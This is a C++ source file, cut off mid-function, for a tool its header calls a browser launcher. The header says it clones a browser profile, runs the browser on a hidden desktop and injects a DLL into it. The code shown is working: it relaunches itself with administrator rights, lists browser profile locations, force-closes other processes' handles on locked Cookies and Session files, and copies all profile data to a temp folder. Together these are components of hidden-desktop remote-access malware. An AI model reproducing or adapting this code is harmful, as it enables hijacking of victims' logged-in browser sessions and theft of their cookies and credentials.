/*
 * Backstage Browser Launcher
 * Translated from Go source (Go-Backstage/capture/backstage_inject_windows.go)
 *
 * Clones a browser profile to a temp directory, removes profile lock files,
 * then launches the browser suspended on a hidden desktop, injects
 * BackstageInjection.x64.dll (reflective by default, LoadLibrary fallback),
 * and resumes.
 *
 * Usage:
 *   BackstageLauncher.exe                   - interactive menu
 *   BackstageLauncher.exe --list            - list installed browsers
 *   BackstageLauncher.exe --browser <key>   - launch by browser key
 *   BackstageLauncher.exe --no-clone        - skip profile clone
 *   BackstageLauncher.exe --lite            - lite clone (skip extensions)
 *   BackstageLauncher.exe --method reflective|loadlibrary
 */

// WIN32_LEAN_AND_MEAN and NOMINMAX are passed on the compiler command line.
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>   // ShellExecuteExA, SHELLEXECUTEINFOA, SEE_MASK_NOCLOSEPROCESS
#include <winternl.h>   // UNICODE_STRING, OBJECT_ATTRIBUTES

#include <algorithm>
#include <array>
#include <atomic>
#include <cassert>
#include <chrono>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iostream>
#include <map>
#include <mutex>
#include <queue>
#include <set>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "shell32.lib")
// ntdll.lib is NOT linked — NtQuerySystemInformation and NtQueryObject are
// resolved dynamically via GetProcAddress(GetModuleHandleA("ntdll.dll"), ...)
// since they are undocumented/semi-documented exports without stable import lib support.

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// NT native API: handle enumeration for unlocking exclusively-held files
// ---------------------------------------------------------------------------
// These structures are undocumented but stable since NT 4 / Win2k.
// Dynamically resolved from ntdll.dll so we never need to link ntdll.lib
// for undocumented exports.

#define SystemHandleInformation 0x10        // info class 16
#define ObjectTypeInformation   2
#define ObjectNameInformation   1
// NT_SUCCESS is already defined in winternl.h; do not redefine it.
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

typedef struct _SYSTEM_HANDLE {
    ULONG      ProcessId;
    UCHAR      ObjectTypeNumber;
    UCHAR      Flags;
    USHORT     Handle;
    PVOID      Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG         HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

// PUBLIC_OBJECT_TYPE_INFORMATION — first field is a UNICODE_STRING TypeName.
// winternl.h does not define this so no guard needed.
typedef struct _BS_OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG          Reserved[22];
} BS_OBJECT_TYPE_INFORMATION, *PBS_OBJECT_TYPE_INFORMATION;

// OBJECT_NAME_INFORMATION — contains a UNICODE_STRING Name.
// winternl.h declares OBJECT_NAME_INFORMATION but may omit the NameBuffer
// flexible member.  Define our own with a distinct name to stay safe.
typedef struct _BS_OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
    WCHAR          NameBuffer[1];
} BS_OBJECT_NAME_INFORMATION, *PBS_OBJECT_NAME_INFORMATION;

typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS (NTAPI *PNtQueryObject)(
    HANDLE Handle,
    ULONG  ObjectInformationClass,
    PVOID  ObjectInformation,
    ULONG  ObjectInformationLength,
    PULONG ReturnLength);

// Resolve once, lazily.
static PNtQuerySystemInformation g_NtQuerySystemInformation = nullptr;
static PNtQueryObject            g_NtQueryObject            = nullptr;

static void EnsureNtdllFuncs() {
    if (g_NtQuerySystemInformation) return;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    g_NtQuerySystemInformation = (PNtQuerySystemInformation)
        GetProcAddress(ntdll, "NtQuerySystemInformation");
    g_NtQueryObject = (PNtQueryObject)
        GetProcAddress(ntdll, "NtQueryObject");
}

// ---------------------------------------------------------------------------
// Admin check + UAC re-launch helpers
// ---------------------------------------------------------------------------

// Returns true if the current process token has the Administrators group
// enabled (i.e. we are already elevated on Vista+, or running as admin on XP).
static bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminSid = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminSid)) {
        CheckTokenMembership(nullptr, adminSid, &isAdmin);
        FreeSid(adminSid);
    }
    return isAdmin != FALSE;
}

// Re-launch this same executable with "runas" verb (triggers UAC prompt).
// Passes the original command line arguments through verbatim.
// Returns true if ShellExecuteEx succeeded (the elevated process was started).
static bool RelaunchAsAdmin(int argc, char* argv[]) {
    char selfPath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);

    // Re-assemble argv[1..] into a single argument string.
    std::string params;
    for (int i = 1; i < argc; ++i) {
        if (i > 1) params += ' ';
        // Wrap each token in quotes to handle spaces.
        params += '"';
        params += argv[i];
        params += '"';
    }

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.hwnd         = nullptr;
    sei.lpVerb       = "runas";
    sei.lpFile       = selfPath;
    sei.lpParameters = params.empty() ? nullptr : params.c_str();
    sei.nShow        = SW_SHOWNORMAL;

    if (!ShellExecuteExA(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED) {
            fprintf(stderr, "UAC prompt cancelled by user.\n");
        } else {
            fprintf(stderr, "ShellExecuteEx(runas) failed: %lu\n", err);
        }
        return false;
    }

    // We don't wait for the elevated child; just exit this non-elevated copy.
    if (sei.hProcess) CloseHandle(sei.hProcess);
    return true;
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------

static void Log(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    char buf[2048];
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    std::cout << "[backstage] " << buf << "\n";
    std::cout.flush();
}

// ---------------------------------------------------------------------------
// Constants (mirrored from Go)
// ---------------------------------------------------------------------------

// Composite access mask used when opening a target process for injection.
// Individual flags (PROCESS_CREATE_THREAD etc.) come from the SDK.
static constexpr DWORD PROCESS_ALL_ACCESS_INJ =
    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

// SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
// IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_OPTIONAL_HDR64_MAGIC
// are all provided by <windows.h> / <winnt.h>; no re-definition needed.


// ---------------------------------------------------------------------------
// Browser descriptor (mirrors Go browserInfo struct)
// ---------------------------------------------------------------------------

struct BrowserInfo {
    std::string  key;           // map key / CLI arg
    std::string  name;          // display name
    std::string  exeName;       // process name (e.g. chrome.exe)
    std::vector<std::string> exePaths; // relative paths tried under ProgramFiles / LOCALAPPDATA
    std::string  userData;      // relative to LOCALAPPDATA (or APPDATA for useAppData)
    bool         useAppData   = false; // use APPDATA instead of LOCALAPPDATA
    bool         isFirefox    = false; // Firefox-style profile layout
    bool         flatProfile  = false; // Opera-style: no Default/Profile subdirs
    bool         needsPatch   = false; // patch GetCursorInfo after launch (Opera/Opera GX)
};

static const std::vector<BrowserInfo> BROWSER_TABLE = {
    {
        "chrome", "Chrome", "chrome.exe",
        { "\\Google\\Chrome\\Application\\chrome.exe" },
        "Google\\Chrome\\User Data"
    },
    {
        "brave", "Brave", "brave.exe",
        { "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" },
        "BraveSoftware\\Brave-Browser\\User Data"
    },
    {
        "edge", "Edge", "msedge.exe",
        { "\\Microsoft\\Edge\\Application\\msedge.exe" },
        "Microsoft\\Edge\\User Data"
    },
    {
        "firefox", "Firefox", "firefox.exe",
        { "\\Mozilla Firefox\\firefox.exe" },
        "Mozilla\\Firefox", /*useAppData=*/true, /*isFirefox=*/true
    },
    {
        "opera", "Opera", "opera.exe",
        { "\\Programs\\Opera\\opera.exe" },
        "Opera Software\\Opera Stable",
        /*useAppData=*/true, /*isFirefox=*/false, /*flatProfile=*/true, /*needsPatch=*/true
    },
    {
        "operagx", "Opera GX", "opera.exe",
        { "\\Programs\\Opera GX\\opera.exe" },
        "Opera Software\\Opera GX Stable",
        /*useAppData=*/true, /*isFirefox=*/false, /*flatProfile=*/true, /*needsPatch=*/true
    },
    {
        "vivaldi", "Vivaldi", "vivaldi.exe",
        { "\\Vivaldi\\Application\\vivaldi.exe" },
        "Vivaldi\\User Data"
    },
    {
        "yandex", "Yandex Browser", "browser.exe",
        { "\\Yandex\\YandexBrowser\\Application\\browser.exe" },
        "Yandex\\YandexBrowser\\User Data"
    },
    {
        "waterfox", "Waterfox", "waterfox.exe",
        { "\\Waterfox\\waterfox.exe" },
        "Waterfox", /*useAppData=*/true, /*isFirefox=*/true
    },
    {
        "arc", "Arc", "Arc.exe",
        { "\\Arc\\Application\\Arc.exe" },
        "Arc\\User Data"
    },
};

// ---------------------------------------------------------------------------
// Helpers: env vars, path helpers
// ---------------------------------------------------------------------------

static std::string GetEnv(const char* var) {
    char buf[4096] = {};
    DWORD n = GetEnvironmentVariableA(var, buf, sizeof(buf));
    return n ? std::string(buf, n) : std::string{};
}

static std::string FindBrowserExe(const BrowserInfo& info) {
    static const char* roots[] = { "ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA" };
    for (auto& root : roots) {
        std::string base = GetEnv(root);
        if (base.empty()) continue;
        for (auto& suffix : info.exePaths) {
            std::string p = base + suffix;
            if (GetFileAttributesA(p.c_str()) != INVALID_FILE_ATTRIBUTES)
                return p;
        }
    }
    return {};
}

static std::string GetUserDataDir(const BrowserInfo& info) {
    std::string base = GetEnv(info.useAppData ? "APPDATA" : "LOCALAPPDATA");
    if (base.empty()) return {};
    std::string dir = base + "\\" + info.userData;
    DWORD attr = GetFileAttributesA(dir.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
        return dir;
    return {};
}

static std::map<std::string, std::string> CheckInstalledBrowsers() {
    std::map<std::string, std::string> result;
    for (auto& info : BROWSER_TABLE) {
        std::string p = FindBrowserExe(info);
        if (!p.empty()) result[info.key] = p;
    }
    return result;
}

// ---------------------------------------------------------------------------
// Profile clone helpers
// ---------------------------------------------------------------------------

static bool IsFirefoxProfileDir(const std::string& name) {
    std::string lower = name;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    return lower.find(".default-release") != std::string::npos ||
           lower.find(".default-esr")     != std::string::npos ||
           lower.find(".default")         != std::string::npos;
}

static bool IsCloneLockFileName(const std::string& name) {
    std::string lower = name;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    // "lock" / "lockfile" — SQLite journal locks (Chrome, Firefox).
    // "parent.lock"       — Firefox/Waterfox inter-process lock; must not be
    //                       in the clone (RemoveProfileLocks deletes it anyway,
    //                       but skipping it here avoids the failed-copy warning).
    return lower == "lock" || lower == "lockfile" || lower == "parent.lock";
}

// ---------------------------------------------------------------------------
// Handle-duplication unlock
// ---------------------------------------------------------------------------
//
// When SeBackupPrivilege is unavailable (non-admin run), Chrome/Brave hold
// Cookies, Session_*, Tabs_*, cache.db* exclusively (FILE_SHARE_NONE).
// We can break that lock from user mode by:
//   1. Enumerating all system handles via NtQuerySystemInformation.
//   2. For each handle owned by a browser process, duplicating it into our
//      process to resolve its NT path via NtQueryObject.
//   3. If the path matches our target file, calling DuplicateHandle a second
//      time with DUPLICATE_CLOSE_SOURCE — this atomically closes the handle
//      in the owner process, releasing the exclusive lock.
//   4. We then immediately close our copy of the handle.
//
// Requires: OpenProcess(PROCESS_DUP_HANDLE) on the owning process, which
// itself requires either admin/SeDebugPrivilege or the same-user + same-IL
// condition.  Returns the number of handles closed (0 = lock not released).
//
// Safety notes:
//   - We query ObjectTypeInformation first and skip non-File handles.
//     NtQueryObject on named-pipe handles to disconnected peers can block
//     indefinitely, so the type check is essential.
//   - We never touch handles in PID 4 (System) or PID 0.
//   - After closing the browser's handle the browser may reopen it; this is
//     fine — we copy immediately after calling this function.

static int UnlockFileHandles(const fs::path& targetPath) {
    EnsureNtdllFuncs();
    if (!g_NtQuerySystemInformation || !g_NtQueryObject) return 0;

    // -----------------------------------------------------------------------
    // Step 1: Convert the Win32 path to its NT device path
    //         (e.g. C:\Users\... -> \Device\HarddiskVolume3\Users\...)
    // We do this by resolving the drive letter via QueryDosDevice.
    // -----------------------------------------------------------------------
    std::wstring win32Path = targetPath.wstring();

    // Extract drive letter (e.g. "C:")
    std::wstring ntPath;
    if (win32Path.size() >= 2 && win32Path[1] == L':') {
        wchar_t drive[3] = { win32Path[0], L':', L'\0' };
        wchar_t devicePath[512] = {};
        if (QueryDosDeviceW(drive, devicePath, 512)) {
            ntPath = std::wstring(devicePath) + win32Path.substr(2);
        }
    }
    if (ntPath.empty()) {
        // Fallback: use the Win32 path with case-insensitive compare.
        ntPath = win32Path;
    }

    // Lowercase for comparison
    std::wstring ntPathLow = ntPath;
    std::transform(ntPathLow.begin(), ntPathLow.end(), ntPathLow.begin(), ::towlower);

    // -----------------------------------------------------------------------
    // Step 2: Enumerate all open handles in the system
    // -----------------------------------------------------------------------
    ULONG bufSize = 1 << 20; // start at 1 MB, double on mismatch
    std::vector<BYTE> buf(bufSize);
    NTSTATUS status;
    for (;;) {
        status = g_NtQuerySystemInformation(SystemHandleInformation,
                                            buf.data(), (ULONG)buf.size(),
                                            &bufSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            buf.resize((size_t)bufSize + (1 << 16));
            continue;
        }
        break;
    }
    if (!NT_SUCCESS(status)) return 0;

    auto* info = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(buf.data());
    int closed = 0;

    // We cache process handles by PID to avoid re-opening the same process
    // for every handle it owns.
    std::map<ULONG, HANDLE> procHandleCache;
    auto getProc = [&](ULONG pid) -> HANDLE {
        auto it = procHandleCache.find(pid);
        if (it != procHandleCache.end()) return it->second;
        HANDLE h = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        procHandleCache[pid] = h; // may be nullptr on failure
        return h;
    };

    // Scratch buffers for NtQueryObject
    std::vector<BYTE> typeBuf(512);
    std::vector<BYTE> nameBuf(2048);

    for (ULONG i = 0; i < info->HandleCount; ++i) {
        const SYSTEM_HANDLE& sh = info->Handles[i];

        // Skip System/Idle PIDs
        if (sh.ProcessId == 0 || sh.ProcessId == 4) continue;

        HANDLE hProc = getProc(sh.ProcessId);
        if (!hProc) continue;

        // -----------------------------------------------------------------------
        // Step 3: Duplicate the handle into our process so we can query it.
        //         Use DUPLICATE_SAME_ACCESS with 0 desired access so we get
        //         whatever access the owner had.
        // -----------------------------------------------------------------------
        HANDLE hDup = nullptr;
        if (!DuplicateHandle(hProc, (HANDLE)(ULONG_PTR)sh.Handle,
                             GetCurrentProcess(), &hDup,
                             0, FALSE, DUPLICATE_SAME_ACCESS)) {
            continue;
        }

        // -----------------------------------------------------------------------
        // Step 4: Check the object type — skip anything that isn't "File".
        //         This avoids blocking on named pipes / sockets.
        // -----------------------------------------------------------------------
        ULONG typeRet = 0;
        status = g_NtQueryObject(hDup, ObjectTypeInformation,
                                 typeBuf.data(), (ULONG)typeBuf.size(),
                                 &typeRet);
        if (!NT_SUCCESS(status)) {
            CloseHandle(hDup);
            continue;
        }
        auto* typeInfo = reinterpret_cast<PBS_OBJECT_TYPE_INFORMATION>(typeBuf.data());
        // TypeName.Buffer is a counted string (not necessarily null-terminated)
        std::wstring typeName(typeInfo->TypeName.Buffer,
                              typeInfo->TypeName.Length / sizeof(wchar_t));
        if (typeName != L"File") {
            CloseHandle(hDup);
            continue;
        }

        // -----------------------------------------------------------------------
        // Step 5: Query the NT object name (full path).
        // -----------------------------------------------------------------------
        ULONG nameRet = 0;
        status = g_NtQueryObject(hDup, ObjectNameInformation,
                                 nameBuf.data(), (ULONG)nameBuf.size(),
                                 &nameRet);
        if (!NT_SUCCESS(status) || nameRet < sizeof(BS_OBJECT_NAME_INFORMATION)) {
            CloseHandle(hDup);
            continue;
        }
        auto* nameInfo = reinterpret_cast<PBS_OBJECT_NAME_INFORMATION>(nameBuf.data());
        if (!nameInfo->Name.Buffer || nameInfo->Name.Length == 0) {
            CloseHandle(hDup);
            continue;
        }

        std::wstring objName(nameInfo->Name.Buffer,
                             nameInfo->Name.Length / sizeof(wchar_t));
        std::wstring objNameLow = objName;
        std::transform(objNameLow.begin(), objNameLow.end(),
                       objNameLow.begin(), ::towlower);

        CloseHandle(hDup); // done with the read copy

        // -----------------------------------------------------------------------
        // Step 6: Does this handle point to our target file?
        //         Compare both the NT device path AND a bare filename suffix
        //         in case the drive mapping didn't resolve.
        // -----------------------------------------------------------------------
        bool match = (objNameLow == ntPathLow);
        if (!match) {
            // Fallback: compare just the filename portion case-insensitively.
            std::wstring targetFileLow = targetPath.filename().wstring();
            std::transform(targetFileLow.begin(), targetFileLow.end(),
                           targetFileLow.begin(), ::towlower);
            // objName must END with \<filename> to count (not a partial match).
            if (objNameLow.size() >= targetFileLow.size() + 1) {
                size_t pos = objNameLow.size() - targetFileLow.size();
                if (objNameLow[pos - 1] == L'\\' &&
                    objNameLow.substr(pos) == targetFileLow) {
                    match = true;
                }
            }
        }

        if (!match) continue;

        // -----------------------------------------------------------------------
        // Step 7: Close the handle in the owner process.
        //         DuplicateHandle with DUPLICATE_CLOSE_SOURCE + NULL target
        //         process closes the source and does not create a copy for us.
        // -----------------------------------------------------------------------
        HANDLE dummy = nullptr;
        if (DuplicateHandle(hProc, (HANDLE)(ULONG_PTR)sh.Handle,
                            GetCurrentProcess(), &dummy,
                            0, FALSE,
                            DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS)) {
            // Close the copy that landed in our process.
            if (dummy) CloseHandle(dummy);
            ++closed;
            Log("handle-unlock: closed handle 0x%X in PID %lu for %s",
                sh.Handle, sh.ProcessId,
                targetPath.filename().string().c_str());
        }
    }

    // Close cached process handles
    for (auto& [pid, h] : procHandleCache)
        if (h) CloseHandle(h);

    return closed;
}

// Copies a single file, overwriting the destination.
//
// Chrome (v104+) and Brave hold Cookies, Session_*, Tabs_*, cache.db* open
// with dwShareMode=0 — a full exclusive deny-all lock.  No share flags on our
// CreateFileW call can override the first opener's lock.
//
// When running as admin, the SeBackupPrivilege path (FILE_FLAG_BACKUP_SEMANTICS)
// bypasses the share-mode check entirely and we never need to touch the browser's
// handles.
//
// When NOT running as admin, SeBackupPrivilege cannot be enabled, so we fall
// back to the handle-duplication unlock: enumerate all open handles via
// NtQuerySystemInformation, find every handle pointing to this file, and
// close each one in its owner process via DuplicateHandle(DUPLICATE_CLOSE_SOURCE).
// After that the file is no longer locked and a plain CreateFile succeeds.
//
// Returns bytes copied on success, -1 on error.
static int64_t ForceCopyFile(const fs::path& src, const fs::path& dst) {
    // FILE_FLAG_BACKUP_SEMANTICS: requests backup-intent open, which combined
    // with SeBackupPrivilege bypasses both DACL and share-mode checks.
    // FILE_FLAG_SEQUENTIAL_SCAN: hints the prefetcher for linear reads.
    HANDLE hSrc = CreateFileW(
        src.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr);

    if (hSrc == INVALID_HANDLE_VALUE) {
        // Backup-semantics open failed (no SeBackupPrivilege / not admin).
        // Handle-unlock was already done in bulk before the parallel copy
        // started (UnlockAllProfileHandles), so the lock should be gone.
        // Plain copy_file is the fallback for any file that is still held
        // or simply needs no special treatment.
        try {
            fs::copy_file(src, dst, fs::copy_options::overwrite_existing);
            return (int64_t)fs::file_size(dst);
        } catch (...) {
            return -1;
        }
    }

    LARGE_INTEGER fileSize{};
    GetFileSizeEx(hSrc, &fileSize);

    HANDLE hDst = CreateFileW(
        dst.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr);

    if (hDst == INVALID_HANDLE_VALUE) {
        CloseHandle(hSrc);
        return -1;
    }

    static constexpr DWORD kBufSize = 1 << 20; // 1 MB read chunks
    std::vector<char> buf(kBufSize);
    int64_t totalWritten = 0;
    bool ok = true;

    while (ok) {
        DWORD bytesRead = 0;
        if (!ReadFile(hSrc, buf.data(), kBufSize, &bytesRead, nullptr)) { ok = false; break; }
        if (bytesRead == 0) break; // EOF

        DWORD bytesWritten = 0;
        if (!WriteFile(hDst, buf.data(), bytesRead, &bytesWritten, nullptr) ||
            bytesWritten != bytesRead) {
            ok = false; break;
        }
        totalWritten += bytesWritten;
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);

    if (!ok) {
        DeleteFileW(dst.c_str());
        return -1;
    }
    return totalWritten;
}

static const std::set<std::string> BASE_SKIP_DIRS = {
    "cache", "code cache", "gpucache", "service worker",
    "crashpad", "blob_storage", "jumplisterrors",
    "optimization_guide_prediction_model_downloads",
    "segmentation_platform", "commerce_local_db"
};

static const std::vector<std::string> LITE_EXTRA_SKIP = {
    "extensions", "extension state", "extension scripts",
    "extension rules", "local extension settings",
    "sync extension settings", "indexeddb", "file system",
    "session storage", "sessions", "sync data",
    "web applications", "webrtc internals", "databases",
    "platform notifications", "gcm store", "storage",
    "feature_engagement_tracker"
};

struct CopyJob {
    fs::path src;
    fs::path dst;
    int64_t  size;
};

static std::string ToLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

// Collect all copyable files from a profile-like directory tree.
static void CollectProfileDir(
    const fs::path& src, const fs::path& dst,
    const std::set<std::string>& skipDirs,
    std::vector<CopyJob>& jobs)
{
    std::error_code ec;
    for (auto& e : fs::directory_iterator(src, ec)) {
        if (ec) break;
        std::string name = e.path().filename().string();
        fs::path s = e.path();
        fs::path d = dst / name;
        if (e.is_directory()) {
            if (skipDirs.count(ToLower(name))) continue;
            // Recurse
            std::error_code ec2;
            for (auto& e2 : fs::recursive_directory_iterator(s, ec2)) {
                if (ec2) break;
                if (!e2.is_regular_file()) continue;
                std::string n2 = e2.path().filename().string();
                if (IsCloneLockFileName(n2)) continue;
                std::error_code relEc;
                fs::path rel = fs::relative(e2.path(), src, relEc);
                if (relEc) continue;
                jobs.push_back({ e2.path(), d.parent_path() / rel,
                                 (int64_t)e2.file_size() });
            }
        } else if (e.is_regular_file()) {
            if (IsCloneLockFileName(name)) continue;
            jobs.push_back({ s, d, (int64_t)e.file_size() });
        }
    }
}

static void CollectDirFiles(
    const fs::path& src, const fs::path& dst,
    std::vector<CopyJob>& jobs)
{
    std::error_code ec;
    for (auto& e : fs::recursive_directory_iterator(src, ec)) {
        if (ec) break;
        if (!e.is_regular_file()) continue;
        std::string name = e.path().filename().string();
        if (IsCloneLockFileName(name)) continue;
        std::error_code relEc;
        fs::path rel = fs::relative(e.path(), src, relEc);
        if (relEc) continue;
        jobs.push_back({ e.path(), dst / rel, (int64_t)e.file_size() });
    }
}

// ---------------------------------------------------------------------------
// Bulk handle unlock — called ONCE before the parallel copy workers start.
//
// UnlockFileHandles() does a full system-wide NtQuerySystemInformation pass.
// Calling it from 16 worker threads simultaneously causes severe kernel-level
// contention (every thread races to DuplicateHandle into/out of the same
// remote processes) and stalls all workers indefinitely, deadlocking the
// doneCv.wait in CloneBrowserProfile.
//
// The correct pattern is a single serial pass over all collected copy jobs
// before the thread pool starts.  We build the set of unique source paths
// that fail a quick open attempt (i.e. are actually exclusively locked), then
// call UnlockFileHandles once per locked file.  After this function returns
// every job should be openable by a plain CreateFileW.
// ---------------------------------------------------------------------------
static void UnlockAllProfileHandles(const std::vector<CopyJob>& jobs) {
    for (const auto& job : jobs) {
        // Quick probe: try to open with the same flags ForceCopyFile uses.
        // If it succeeds the file is not exclusively locked — skip it.
        HANDLE h = CreateFileW(
            job.src.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
            nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            continue; // not locked
        }

        // File is locked — close all handles pointing to it.
        int n = UnlockFileHandles(job.src);
        if (n > 0) {
            Log("handle-unlock: released %d handle(s) on %s",
                n, job.src.filename().string().c_str());
        }
    }
}

// Full profile clone. Returns the clone directory, or empty on error.
static std::string CloneBrowserProfile(
    const BrowserInfo& info,
    const std::string& srcUserData,
    bool lite)
{
    std::string prefix = "backstage_" + ToLower(info.name) + "_";

    // Remove old clones
    fs::path tmpDir = fs::temp_directory_path();
    std::error_code ec;
    for (auto& e : fs::directory_iterator(tmpDir, ec)) {
        if (!e.is_directory()) continue;
        std::string n = e.path().filename().string();
        if (n.rfind(prefix, 0) == 0) {
            fs::remove_all(e.path(), ec);
            Log("removed old clone %s", e.path().string().c_str());
        }
    }

    // Unique clone dir
    auto now = std::chrono::steady_clock::now().time_since_epoch().count();
    fs::path cloneBase = tmpDir / (prefix + std::to_string(now));
    fs::create_directories(cloneBase, ec);
    if (ec) {
        Log("mkdir clone failed: %s", ec.message().c_str());
        return {};
    }

    // Build skip set
    std::set<std::string> skipDirs = BASE_SKIP_DIRS;
    if (lite) {
        for (auto& d : LITE_EXTRA_SKIP) skipDirs.insert(d);
    }

    // Collect copy jobs
    std::vector<CopyJob> jobs;
    fs::path srcPath = srcUserData;
    std::error_code listEc;
    for (auto& entry : fs::directory_iterator(srcPath, listEc)) {
        if (listEc) break;
        std::string name = entry.path().filename().string();
        fs::path s = entry.path();
        fs::path d = cloneBase / name;

        if (entry.is_directory()) {
            if (info.flatProfile) {
                CollectProfileDir(s, d, skipDirs, jobs);
            } else {
                bool isProfile = false;
                if (info.isFirefox) {
                    isProfile = IsFirefoxProfileDir(name);
                } else {
                    std::string nl = ToLower(name);
                    isProfile = nl == "default" || nl.rfind("profile ", 0) == 0;
                }
                if (isProfile) {
                    CollectProfileDir(s, d, skipDirs, jobs);
                } else if (!skipDirs.count(ToLower(name))) {
                    CollectDirFiles(s, d, jobs);
                }
            }
        } else if (entry.is_regular_file()) {
            if (!IsCloneLockFileName(name))
                jobs.push_back({ s, d, (int64_t)entry.file_size() });
        }
    }

    Log("cloning %zu files to %s", jobs.size(), cloneBase.string().c_str());

    // Create all destination directories up front (must be serial).
    std::set<fs::path> dirs;
    for (auto& j : jobs) dirs.insert(j.dst.parent_path());
    for (auto& d : dirs) fs::create_directories(d, ec);

    // ---------------------------------------------------------------------------
    // Pre-unlock: single serial pass to release exclusive handles BEFORE the
    // parallel workers start.  Doing this inside ForceCopyFile (called from
    // 16 threads simultaneously) causes kernel-level handle-table contention
    // that stalls all workers and deadlocks the doneCv.wait below.
    // ---------------------------------------------------------------------------
    UnlockAllProfileHandles(jobs);

    // ---------------------------------------------------------------------------
    // Parallel copy: thread pool — saturates NVMe queue depth for small files.
    // 16 workers is the sweet spot for a local SSD with thousands of KB-range
    // files; the OS I/O scheduler merges requests efficiently at this concurrency.
    // ---------------------------------------------------------------------------
    static constexpr int kWorkers = 16;

    std::queue<const CopyJob*> workQueue;
    std::mutex                 queueMu;
    std::condition_variable    queueCv;   // wakes workers when jobs arrive / shutdown
    std::condition_variable    doneCv;    // wakes main when all work is finished
    std::atomic<int64_t>       failedCount{0};
    int                        inFlight = 0; // jobs popped but not yet finished (guarded by queueMu)
    bool                       shutdown = false;

    for (auto& j : jobs) workQueue.push(&j);

    auto worker = [&]() {
        for (;;) {
            const CopyJob* job = nullptr;
            {
                std::unique_lock<std::mutex> lk(queueMu);
                queueCv.wait(lk, [&]{ return !workQueue.empty() || shutdown; });
                if (workQueue.empty()) return; // shutdown && empty → exit
                job = workQueue.front();
                workQueue.pop();
                ++inFlight;
            }

            // 3 attempts, 200ms between retries.
            // Retry delay is shorter — with share-mode open, locked-file errors
            // are handled at the handle level; retries now only cover transient I/O.
            bool ok = false;
            for (int attempt = 0; attempt < 3; ++attempt) {
                if (attempt > 0)
                    std::this_thread::sleep_for(std::chrono::milliseconds(200));
                if (ForceCopyFile(job->src, job->dst) >= 0) { ok = true; break; }
            }
            if (!ok) {
                ++failedCount;
                Log("warning: could not copy %s after retries",
                    job->src.filename().string().c_str());
            }

            {
                std::unique_lock<std::mutex> lk(queueMu);
                --inFlight;
                if (workQueue.empty() && inFlight == 0)
                    doneCv.notify_one(); // tell main all work is done
            }
        }
    };

    // Spawn workers then wake them.
    std::vector<std::thread> threads;
    threads.reserve(kWorkers);
    for (int i = 0; i < kWorkers; ++i)
        threads.emplace_back(worker);
    queueCv.notify_all();

    // Wait until queue is empty AND no job is still executing.
    {
        std::unique_lock<std::mutex> lk(queueMu);
        doneCv.wait(lk, [&]{ return workQueue.empty() && inFlight == 0; });
        shutdown = true;
    }
    queueCv.notify_all(); // wake blocked workers so they exit
    for (auto& t : threads) t.join();

    int64_t failed = failedCount.load();
    if (failed > 0)
        Log("clone finished with %lld skipped files", (long long)failed);
    else
